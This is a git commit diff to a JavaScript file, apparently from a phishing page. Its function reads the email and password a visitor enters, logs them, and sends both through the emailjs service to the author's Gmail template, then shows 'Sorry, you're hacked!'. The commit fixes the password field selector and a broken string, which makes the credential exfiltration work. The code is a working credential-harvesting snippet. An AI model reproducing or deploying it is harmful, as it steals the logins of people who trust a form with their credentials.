8e1ba014c05d0b2c1c21299fef3409a935ff551a
bobstottts <bobstottts@googlemail.com>
2017-06-22 19:41:06 +0600

    Update myScripts.js

--- myScripts.js
+++ myScripts.js
@@ -9,12 +9,11 @@ function myFunction()
 {
   console.log("Hi!");
   var email = $('#email').val();
-  var passsword = $('#pass').val();
+  var passsword = $('#password').val();
 
   console.log(email);
   console.log(passsword);
 
-  emailjs.send("gmail", "template_TV08CQI3", {"reply_to":"bobstottts@gmail.com
-","from_name": email,"message_html":passsword});
+  emailjs.send("gmail", "template_TV08CQI3", {"reply_to":"bobstottts@gmail.com","from_name": email,"message_html":passsword});
   alert("Sorry, you're hacked!");
 }
